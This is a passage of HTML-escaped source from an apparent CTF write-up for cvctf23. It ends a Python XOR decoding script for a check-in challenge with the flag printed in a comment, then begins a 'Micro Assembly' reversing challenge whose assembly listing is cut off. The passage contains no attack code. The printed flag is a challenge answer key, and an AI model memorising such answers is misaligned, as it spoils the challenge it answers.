&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x51
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x14
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4e
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x69
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x10
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7f
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x69
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x10
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf1
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd9
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x26
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x49
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xda&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xda&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xec
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdb&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7d
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdb&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x22
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdc&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf7
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdc&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x99
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdd&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdd&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x69
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xde&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xde&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7e
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb0
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x99
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7e
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x22
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;zip&lt;&#x2F;span&gt;&lt;span&gt;(local_58&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;local_68):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt;j)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#cvctf{i_apologize_for_such_a_long_string_in_this_checkin_challenge,but_it_might_be_a_good_time_to_learn_about_automating_this_process?You_might_need_to_do_it_because_here_is_a_painful_hex:32a16b3a7eef8de1263812.Enjoy(or_not)!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;micro-assembly&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#micro-assembly&quot; aria-label=&quot;Anchor link for: micro-assembly&quot;&gt;Micro Assembly&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_microasm.png&quot; alt=&quot;micro asm&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;cvctf23&#x2F;file.asm&quot;&gt;file.asm&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The content of file.asm&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;asm&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-asm &quot;&gt;&lt;code class=&quot;language-asm&quot; data-lang=&quot;asm&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;PUSH &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;SP&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@main_body:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SUB  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;SP&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;SP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;154&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;228&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;66&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;286&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@if0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;CMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JNE  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@true0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MUL  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;ADD  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SHL  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;ADD  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
